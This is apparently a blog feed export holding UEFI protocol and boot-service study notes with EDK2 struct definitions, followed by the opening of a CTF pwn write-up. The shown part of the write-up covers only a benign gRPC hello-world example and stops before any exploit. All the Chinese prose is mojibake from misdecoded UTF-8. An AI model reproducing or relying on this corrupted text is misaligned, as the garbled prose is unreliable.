title="UEFIä¸­çš„Protocol"></a>UEFIä¸­çš„Protocol</h1><p>UEFIä¸­çš„Protocolå¼•å…¥äº†é¢å‘å¯¹è±¡çš„æ€æƒ³ï¼š</p><ul><li>ç”¨structæ¨¡æ‹Ÿclass</li><li>ç”¨å‡½æ•°æŒ‡é’ˆæ¨¡æ‹Ÿæˆå‘˜å‡½æ•°<ul><li>è¿™ç§å‡½æ•°çš„ç¬¬ä¸€å‚æ•°å¿…é¡»æ˜¯æŒ‡å‘Protocolçš„æŒ‡é’ˆ</li><li>ç”¨æ¥æ¨¡æ‹ŸthisæŒ‡é’ˆ</li></ul></li></ul><p>ä¸€ä¸ªProtocolå®ä¾‹ä¾‹å­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// MdePkg\Include\Protocol\BlockIo.h</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">EFI_BLOCK_IO_PROTOCOL</span> &#123;</span><br>  UINT64                Revision;<br>  EFI_BLOCK_IO_MEDIA    *Media;<br><br>  EFI_BLOCK_RESET       Reset;<br>  EFI_BLOCK_READ        ReadBlocks;<br>  EFI_BLOCK_WRITE       WriteBlocks;<br>  EFI_BLOCK_FLUSH       FlushBlocks;<br>&#125;;<br><br><span class="hljs-keyword">extern</span> EFI_GUID  gEfiBlockIoProtocolGuid;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// MdePkg\MdePkg.dec</span><br><br>  ## Include/Protocol/BlockIo.h<br>  gEfiBlockIoProtocolGuid        = &#123; <span class="hljs-number">0x964E5B21</span>, <span class="hljs-number">0x6459</span>, <span class="hljs-number">0x11D2</span>, &#123; <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x3B</span> &#125;&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// MdePkg\Include\Protocol\BlockIo.h</span><br><br><span class="hljs-keyword">typedef</span><br><span class="hljs-title function_">EFI_STATUS</span><br><span class="hljs-params">(EFIAPI *EFI_BLOCK_READ)</span><span class="hljs-params">(</span><br><span class="hljs-params">  IN EFI_BLOCK_IO_PROTOCOL          *This,</span><br><span class="hljs-params">  IN UINT32                         MediaId,</span><br><span class="hljs-params">  IN EFI_LBA                        Lba,</span><br><span class="hljs-params">  IN UINTN                          BufferSize,</span><br><span class="hljs-params">  OUT VOID                          *Buffer</span><br><span class="hljs-params">  )</span>;<br></code></pre></td></tr></table></figure><h2 id="Protocolåœ¨UEFIå†…æ ¸ä¸­çš„è¡¨ç¤º"><a href="#Protocolåœ¨UEFIå†…æ ¸ä¸­çš„è¡¨ç¤º" class="headerlink" title="Protocolåœ¨UEFIå†…æ ¸ä¸­çš„è¡¨ç¤º"></a>Protocolåœ¨UEFIå†…æ ¸ä¸­çš„è¡¨ç¤º</h2><ul><li><p>EFI_HANDLEï¼šUEFIç”¨äºè¡¨ç¤ºæŒ‡å‘ä¸€ä¸ªå¯¹è±¡çš„æŒ‡é’ˆ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> VOID *EFI_HANDLE;<br></code></pre></td></tr></table></figure><ul><li>Controllerï¼šä¸€ä¸ªEFI_HANDLEå¯¹è±¡<ul><li>ç”¨äºæ§åˆ¶è®¾å¤‡</li><li>UEFIæ‰«ææ€»çº¿åä¼šä¸ºæ‰€æœ‰è®¾å¤‡å»ºç«‹ä¸€ä¸ªController</li></ul></li><li>Imageï¼šä¹Ÿæ˜¯ä¸€ä¸ªEFI_HANDLEå¯¹è±¡<ul><li>.efiæ–‡ä»¶è¢«åŠ è½½è¿›å†…å­˜åå»ºç«‹</li></ul></li></ul></li><li><p>IHANDLEï¼šEFI_HANDLEæŒ‡å‘çš„å¯¹è±¡è¡¨ç¤ºç»“æ„ä½“</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>  UINTN         Signature;<br>  <span class="hljs-comment">/// All handles list of IHANDLE</span><br>  LIST_ENTRY    AllHandles;<br>  <span class="hljs-comment">/// List of PROTOCOL_INTERFACE&#x27;s for this handle</span><br>  LIST_ENTRY    Protocols;<br>  UINTN         LocateRequest;<br>  <span class="hljs-comment">/// The Handle Database Key value when this handle was last created or modified</span><br>  UINT64        Key;<br>&#125; IHANDLE;<br></code></pre></td></tr></table></figure></li><li><p>PROTOCOL_INTERFACEï¼šè¡¨ç¤ºhandleå’ŒProtocolçš„æ¥å£</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>  UINTN             Signature;<br>  <span class="hljs-comment">/// Link on IHANDLE.Protocols</span><br>  LIST_ENTRY        Link;<br>  <span class="hljs-comment">/// Back pointer</span><br>  IHANDLE           *Handle;<br>  <span class="hljs-comment">/// Link on PROTOCOL_ENTRY.Protocols</span><br>  LIST_ENTRY        ByProtocol;<br>  <span class="hljs-comment">/// The protocol ID</span><br>  PROTOCOL_ENTRY    *Protocol;<br>  <span class="hljs-comment">/// The interface value</span><br>  VOID              *Interface;<br>  <span class="hljs-comment">/// OPEN_PROTOCOL_DATA list</span><br>  LIST_ENTRY        OpenList;<br>  UINTN             OpenListCount;<br>&#125; PROTOCOL_INTERFACE;<br></code></pre></td></tr></table></figure></li><li><p>PROTOCOL_ENTRYï¼šè¡¨ç¤ºProtocolçš„GUID</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>  UINTN         Signature;<br>  <span class="hljs-comment">/// Link Entry inserted to mProtocolDatabase</span><br>  LIST_ENTRY    AllEntries;<br>  <span class="hljs-comment">/// ID of the protocol</span><br>  EFI_GUID      ProtocolID;<br>  <span class="hljs-comment">/// All protocol interfaces</span><br>  LIST_ENTRY    Protocols;<br>  <span class="hljs-comment">/// Registerd notification handlers</span><br>  LIST_ENTRY    Notify;<br>&#125; PROTOCOL_ENTRY;<br></code></pre></td></tr></table></figure></li></ul><p>å‡ ä¸ªç»“æ„ä½“ä¹‹é—´çš„å…³ç³»ï¼š</p><img src="/2024/03/27/UEFI%E5%8E%9F%E7%90%86%E4%B8%8E%E7%BC%96%E7%A8%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/handle.png" class title="handle"><h2 id="å¦‚ä½•ä½¿ç”¨Protocol"><a href="#å¦‚ä½•ä½¿ç”¨Protocol" class="headerlink" title="å¦‚ä½•ä½¿ç”¨Protocol"></a>å¦‚ä½•ä½¿ç”¨Protocol</h2><p>ä½¿ç”¨Protocolçš„ä¸€èˆ¬æ­¥éª¤ï¼š</p><ul><li><p>æ‰¾å‡ºProtocolå¯¹è±¡</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">gBS-&gt;OpenProtocol / HandleProtocol / LocateProtocol<br></code></pre></td></tr></table></figure></li><li><p>ä½¿ç”¨è¿™ä¸ªProtocolæä¾›çš„æœåŠ¡</p></li><li><p>å…³é—­æ‰“å¼€çš„Protocol</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">gBs-&gt;CloseProtocol<br></code></pre></td></tr></table></figure></li></ul><h3 id="OpenProtocol"><a href="#OpenProtocol" class="headerlink" title="OpenProtocol"></a>OpenProtocol</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span><br><span class="hljs-title function_">EFI_STATUS</span><br><span class="hljs-params">(EFIAPI *EFI_OPEN_PROTOCOL)</span><span class="hljs-params">(</span><br><span class="hljs-params">  IN  EFI_HANDLE                Handle,<span class="hljs-comment">// æŒ‡å®šçš„Handleï¼Œå°†æŸ¥è¯¢å¹¶æ‰“å¼€æ­¤Handleä¸­å®‰è£…çš„Protocol</span></span><br><span class="hljs-params">  IN  EFI_GUID                  *Protocol,<span class="hljs-comment">// è¦æ‰“å¼€çš„Protocol GUID</span></span><br><span class="hljs-params">  OUT VOID                      **Interface  OPTIONAL,<span class="hljs-comment">// è¿”å›æ‰“å¼€çš„Protocolå¯¹è±¡</span></span><br><span class="hljs-params">  IN  EFI_HANDLE                AgentHandle,<span class="hljs-comment">// æ‰“å¼€æ­¤Protocolçš„Image</span></span><br><span class="hljs-params">  IN  EFI_HANDLE                ControllerHandle,<span class="hljs-comment">// ä½¿ç”¨æ­¤Protocolçš„æ§åˆ¶å™¨</span></span><br><span class="hljs-params">  IN  UINT32                    Attributes<span class="hljs-comment">// æ‰“å¼€Protocolçš„æ–¹å¼</span></span><br><span class="hljs-params">  )</span>;<br></code></pre></td></tr></table></figure><h3 id="HandleProtocol"><a href="#HandleProtocol" class="headerlink" title="HandleProtocol"></a>HandleProtocol</h3><p>OpenProtocolçš„ç®€åŒ–</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span><br><span class="hljs-title function_">EFI_STATUS</span><br><span class="hljs-params">(EFIAPI *EFI_HANDLE_PROTOCOL)</span><span class="hljs-params">(</span><br><span class="hljs-params">  IN  EFI_HANDLE               Handle,</span><br><span class="hljs-params">  IN  EFI_GUID                 *Protocol,</span><br><span class="hljs-params">  OUT VOID                     **Interface</span><br><span class="hljs-params">  )</span>;<br></code></pre></td></tr></table></figure><h3 id="LocateProtocol"><a href="#LocateProtocol" class="headerlink" title="LocateProtocol"></a>LocateProtocol</h3><p>ä»UEFIå†…æ ¸ä¸­æ‰¾å‡ºæŒ‡å®šProtocolçš„ç¬¬ä¸€ä¸ªå®ä¾‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span><br><span class="hljs-title function_">EFI_STATUS</span><br><span class="hljs-params">(EFIAPI *EFI_LOCATE_PROTOCOL)</span><span class="hljs-params">(</span><br><span class="hljs-params">  IN  EFI_GUID  *Protocol,</span><br><span class="hljs-params">  IN  VOID      *Registration  OPTIONAL,</span><br><span class="hljs-params">  OUT VOID      **Interface</span><br><span class="hljs-params">  )</span>;<br></code></pre></td></tr></table></figure><h3 id="CloseProtocol"><a href="#CloseProtocol" class="headerlink" title="CloseProtocol"></a>CloseProtocol</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span><br><span class="hljs-title function_">EFI_STATUS</span><br><span class="hljs-params">(EFIAPI *EFI_CLOSE_PROTOCOL)</span><span class="hljs-params">(</span><br><span class="hljs-params">  IN EFI_HANDLE               Handle,</span><br><span class="hljs-params">  IN EFI_GUID                 *Protocol,</span><br><span class="hljs-params">  IN EFI_HANDLE               AgentHandle,</span><br><span class="hljs-params">  IN EFI_HANDLE               ControllerHandle</span><br><span class="hljs-params">  )</span>;<br></code></pre></td></tr></table></figure><h1 id="UEFIåŸºç¡€æœåŠ¡"><a href="#UEFIåŸºç¡€æœåŠ¡" class="headerlink" title="UEFIåŸºç¡€æœåŠ¡"></a>UEFIåŸºç¡€æœåŠ¡</h1><h2 id="ç³»ç»Ÿè¡¨"><a href="#ç³»ç»Ÿè¡¨" class="headerlink" title="ç³»ç»Ÿè¡¨"></a>ç³»ç»Ÿè¡¨</h2><ul><li>ç”¨æˆ·ç©ºé—´é€šå‘ç³»ç»Ÿç©ºé—´çš„é€šé“</li><li>DXEé˜¶æ®µåˆå§‹åŒ–</li><li>å…¨å±€ç»“æ„ä½“</li></ul><h3 id="åº”ç”¨ç¨‹åºå’Œé©±åŠ¨å¦‚ä½•è®¿é—®"><a href="#åº”ç”¨ç¨‹åºå’Œé©±åŠ¨å¦‚ä½•è®¿é—®" class="headerlink" title="åº”ç”¨ç¨‹åºå’Œé©±åŠ¨å¦‚ä½•è®¿é—®"></a>åº”ç”¨ç¨‹åºå’Œé©±åŠ¨å¦‚ä½•è®¿é—®</h3><p>ç³»ç»Ÿè¡¨æŒ‡é’ˆä½œä¸ºImageå…¥å£å‡½æ•°çš„å‚æ•°ä¼ é€’åˆ°ç”¨æˆ·ç©ºé—´</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span><br><span class="hljs-title function_">EFI_STATUS</span><br><span class="hljs-params">(EFIAPI *EFI_IMAGE_ENTRY_POINT)</span><span class="hljs-params">(</span><br><span class="hljs-params">  IN  EFI_HANDLE                   ImageHandle,<span class="hljs-comment">// Imageçš„å¥æŸ„</span></span><br><span class="hljs-params">  IN  EFI_SYSTEM_TABLE             *SystemTable <span class="hljs-comment">// ç³»ç»Ÿè¡¨æŒ‡é’ˆ</span></span><br><span class="hljs-params">  )</span>;<br></code></pre></td></tr></table></figure><h3 id="ç³»ç»Ÿè¡¨æ„æˆ"><a href="#ç³»ç»Ÿè¡¨æ„æˆ" class="headerlink" title="ç³»ç»Ÿè¡¨æ„æˆ"></a>ç³»ç»Ÿè¡¨æ„æˆ</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>  EFI_TABLE_HEADER                   Hdr;<span class="hljs-comment">// æ ‡å‡†UEFIè¡¨å¤´</span><br>  CHAR16                             *FirmwareVendor; <span class="hljs-comment">// å›ºä»¶æä¾›å•†</span><br>  UINT32                             FirmwareRevision; <span class="hljs-comment">// å›ºä»¶ç‰ˆæœ¬å·</span><br>  EFI_HANDLE                         ConsoleInHandle; <span class="hljs-comment">// è¾“å…¥æ§åˆ¶å°çš„å¥æŸ„</span><br>  EFI_SIMPLE_TEXT_INPUT_PROTOCOL     *ConIn;<br>  EFI_HANDLE                         ConsoleOutHandle; <span class="hljs-comment">// è¾“å‡ºæ§åˆ¶å°çš„å¥æŸ„</span><br>  EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL    *ConOut;<br>  EFI_HANDLE                         StandardErrorHandle;  <span class="hljs-comment">// æ ‡å‡†é”™è¯¯æ§åˆ¶å°çš„å¥æŸ„</span><br>  EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL    *StdErr;<br>  EFI_RUNTIME_SERVICES               *RuntimeServices; <span class="hljs-comment">// RTæœåŠ¡è¡¨</span><br>  EFI_BOOT_SERVICES                  *BootServices; <span class="hljs-comment">// BSæœåŠ¡è¡¨</span><br>  UINTN                              NumberOfTableEntries;  <span class="hljs-comment">// ConfigurationTableæ•°ç»„å¤§å°</span><br>  EFI_CONFIGURATION_TABLE            *ConfigurationTable;  <span class="hljs-comment">// ç³»ç»Ÿé…ç½®è¡¨æ•°ç»„</span><br>&#125; EFI_SYSTEM_TABLE;<br></code></pre></td></tr></table></figure><h2 id="å¯åŠ¨æœåŠ¡"><a href="#å¯åŠ¨æœåŠ¡" class="headerlink" title="å¯åŠ¨æœåŠ¡"></a>å¯åŠ¨æœåŠ¡</h2><p>å¯åŠ¨æœåŠ¡åˆ†ä¸ºä»¥ä¸‹å‡ ç±»ï¼š</p><ul><li><p>UEFIäº‹ä»¶æœåŠ¡</p><img src="/2024/03/27/UEFI%E5%8E%9F%E7%90%86%E4%B8%8E%E7%BC%96%E7%A8%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/event.png" class title="event"></li><li><p>å†…å­˜ç®¡ç†æœåŠ¡</p><img src="/2024/03/27/UEFI%E5%8E%9F%E7%90%86%E4%B8%8E%E7%BC%96%E7%A8%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/mem.png" class title="mem"></li><li><p>Protocolç®¡ç†æœåŠ¡</p><img src="/2024/03/27/UEFI%E5%8E%9F%E7%90%86%E4%B8%8E%E7%BC%96%E7%A8%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/protocol.png" class title="protocol"></li><li><p>Protocolä½¿ç”¨ç±»æœåŠ¡</p><img src="/2024/03/27/UEFI%E5%8E%9F%E7%90%86%E4%B8%8E%E7%BC%96%E7%A8%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/use.png" class title="use"></li><li><p>é©±åŠ¨ç®¡ç†æœåŠ¡</p><img src="/2024/03/27/UEFI%E5%8E%9F%E7%90%86%E4%B8%8E%E7%BC%96%E7%A8%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/drive.png" class title="drive"></li><li><p>Imageç®¡ç†æœåŠ¡</p><img src="/2024/03/27/UEFI%E5%8E%9F%E7%90%86%E4%B8%8E%E7%BC%96%E7%A8%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/image.png" class title="image"></li><li><p>ExitBootServiceæœåŠ¡</p></li><li><p>å…¶ä»–</p><img src="/2024/03/27/UEFI%E5%8E%9F%E7%90%86%E4%B8%8E%E7%BC%96%E7%A8%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/etc.png" class title="etc"></li></ul><h2 id="è¿è¡Œæ—¶æœåŠ¡"><a href="#è¿è¡Œæ—¶æœåŠ¡" class="headerlink" title="è¿è¡Œæ—¶æœåŠ¡"></a>è¿è¡Œæ—¶æœåŠ¡</h2><ul><li>æ—¶é—´æœåŠ¡<ul><li>è¯»å– &#x2F; è®¾å®šç³»ç»Ÿæ—¶é—´</li><li>è¯»å– &#x2F; è®¾å®šç³»ç»Ÿä»ç¡çœ ä¸­å”¤é†’çš„æ—¶é—´</li></ul></li><li>è¯»å†™ç³»ç»Ÿå˜é‡æœåŠ¡<ul><li>è¯»å– &#x2F; è®¾ç½®ç³»ç»Ÿå˜é‡</li></ul></li><li>è™šæ‹Ÿå†…å­˜æœåŠ¡<ul><li>å°†ç‰©ç†å†…å­˜è½¬åŒ–ä¸ºè™šæ‹Ÿå†…å­˜</li></ul></li><li>å…¶ä»–æœåŠ¡</li></ul>]]></content>
    
    
    <categories>
      
      <category>UEFI</category>
      
    </categories>
    
    
    <tags>
      
      <tag>uefi</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2024 DubheCTF pwn wp</title>
    <link href="/2024/03/19/%E5%A4%A9%E6%9E%A2ctf-wp/"/>
    <url>/2024/03/19/%E5%A4%A9%E6%9E%A2ctf-wp/</url>
    
    <content type="html"><![CDATA[<p>o4æœ€èµ¢çš„ä¸€é›†ï¼*â˜…,Â°*:.â˜†(ï¿£â–½ï¿£)&#x2F;$:*.Â°â˜…* ã€‚</p><span id="more"></span><h1 id="ggbond"><a href="#ggbond" class="headerlink" title="ggbond"></a>ggbond</h1><p>ä¸€ä¸ªgoå†™çš„grpcï¼Œ8.3çš„IDA yyds</p><p>ä½†æœ‰ä¸ªå±‘æ²¡æƒ³åˆ°æœæ–‡ä»¶æprotoçš„å·¥å…·å‡†å¤‡å—¯é€†ï¼Œé‡å¤ä¸€ä¸ªæ‰“å¼€IDAå¼€é€†â€”â€”æ”¾å¼ƒâ€”â€”å†å¼€é€†â€”â€”å†æ”¾å¼ƒçš„è¿‡ç¨‹</p><h2 id="grpc"><a href="#grpc" class="headerlink" title="grpc"></a>grpc</h2><p>å¯ä»¥ç®€å•ç†è§£ä¸ºè¿œç¨‹è°ƒç”¨å‡½æ•°</p><p>ä¸€ä¸ªgrpc serverç¤ºä¾‹ï¼ˆéƒ¨åˆ†ï¼‰</p><ul><li><p>greeter_server&#x2F;main.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br>  <span class="hljs-string">&quot;context&quot;</span><br>  <span class="hljs-string">&quot;flag&quot;</span><br>  <span class="hljs-string">&quot;fmt&quot;</span><br>  <span class="hljs-string">&quot;log&quot;</span><br>  <span class="hljs-string">&quot;net&quot;</span><br><br>  <span class="hljs-string">&quot;google.golang.org/grpc&quot;</span><br>  pb <span class="hljs-string">&quot;hellogrpc/hellogrpc&quot;</span><br>)<br><br><span class="hljs-keyword">var</span> (<br>  port = flag.Int(<span class="hljs-string">&quot;port&quot;</span>, <span class="hljs-number">50051</span>, <span class="hljs-string">&quot;The server port&quot;</span>)<br>)<br><br><span class="hljs-comment">// serveråµŒå…¥äº†pb.UnimplementedGreeterServerï¼Œè¡¨ç¤ºserverå°†å®ç°pb.GreeterServeræ¥å£çš„æ‰€æœ‰æ–¹æ³•</span><br><span class="hljs-keyword">type</span> server <span class="hljs-keyword">struct</span> &#123;<br>  pb.UnimplementedGreeterServer<br>&#125;<br><br><span class="hljs-comment">// serverç»“æ„ä½“çš„æ–¹æ³•ï¼Œå®ç°äº†pb.GreeterServerä¸­çš„SayHelloæ–¹æ³•</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s *server)</span></span> SayHello(ctx context.Context, in *pb.HelloRequest) (*pb.HelloReply, <span class="hljs-type">error</span>) &#123;<br>  log.Printf(<span class="hljs-string">&quot;Received: %v&quot;</span>, in.GetName())<br>  <span class="hljs-keyword">return</span> &amp;pb.HelloReply&#123;Message: <span class="hljs-string">&quot;Hello &quot;</span> + in.GetName()&#125;, <span class="hljs-literal">nil</span><br>&#125;<br><br><span class="hljs-comment">// åŒä¸Šï¼Œå®ç°äº†SayHelloAgainæ–¹æ³•</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s *server)</span></span> SayHelloAgain(ctx context.Context, in *pb.HelloRequest) (*pb.HelloReply, <span class="hljs-type">error</span>) &#123;<br>  <span class="hljs-keyword">return</span> &amp;pb.HelloReply&#123;Message: <span class="hljs-string">&quot;Hello again &quot;</span> + in.GetName()&#125;, <span class="hljs-literal">nil</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>  flag.Parse() <span class="hljs-comment">// è§£æå‘½ä»¤è¡Œå‚æ•°</span><br>  lis, err := net.Listen(<span class="hljs-string">&quot;tcp&quot;</span>, fmt.Sprintf(<span class="hljs-string">&quot;:%d&quot;</span>, *port)) <span class="hljs-comment">// å»ºç«‹tcpç›‘å¬å™¨</span><br>  <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>    log.Fatalf(<span class="hljs-string">&quot;failed to listen: %v&quot;</span>, err)<br>  &#125;<br>  s := grpc.NewServer() <span class="hljs-comment">// åˆ›å»ºgrpcæœåŠ¡å™¨å®ä¾‹</span><br>  pb.RegisterGreeterServer(s, &amp;server&#123;&#125;) <span class="hljs-comment">// æ³¨å†Œå®ä¾‹</span><br>  log.Printf(<span class="hljs-string">&quot;server listening at %v&quot;</span>, lis.Addr())<br>  <span class="hljs-keyword">if</span> err := s.Serve(lis); err != <span class="hljs-literal">nil</span> &#123; <span class="hljs-comment">// å¼€å§‹ç›‘å¬å¹¶å¤„ç†å®¢æˆ·ç«¯çš„è¯·æ±‚</span><br>    log.Fatalf(<span class="hljs-string">&quot;failed to serve: %v&quot;</span>, err)<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>hellogrpc&#x2F;hellogrpc.proto</p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs protobuf">syntax = <span class="hljs-string">&quot;proto3&quot;</span>;<br><span class="hljs-keyword">option</span> go_package = <span class="hljs-string">&quot;hellogrpc/hellogrpc&quot;</span>;<br><span class="hljs-keyword">package</span> hellogrpc;<br><span class="hljs-comment">// The greeting service definition.</span><br><span class="hljs-keyword">service </span><span class="hljs-title class_">Greeter</span> &#123;<br>  <span class="hljs-comment">// Sends a greeting</span><br>  <span class="hljs-function"><span class="hljs-keyword">rpc</span> SayHello (HelloRequest) <span class="hljs-keyword">returns</span> (HelloReply) </span>&#123;&#125;<br>  <span class="hljs-function"><span class="hljs-keyword">rpc</span> SayHelloAgain (HelloRequest) <span class="hljs-keyword">returns</span> (HelloReply) </span>&#123;&#125;<br>&#125;<br><span class="hljs-comment">// The request message containing the user&#x27;s name.</span><br><span class="hljs-keyword">message </span><span class="hljs-title class_">HelloRequest</span> &#123;<br>  <span class="hljs-type">string</span> name = <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-comment">// The response message containing the greetings</span><br><span class="hljs-keyword">message </span><span class="hljs-title class_">HelloReply</span> &#123;<br>  <span class="hljs-type">string</span> message = <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>hellogrpc&#x2F;hellogrpc_grpc.pb.goï¼ˆéƒ¨åˆ†ï¼‰ï¼Œåªæ”¾ä¸€ä¸‹ä¸Šé¢æåˆ°çš„éƒ¨åˆ†</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td 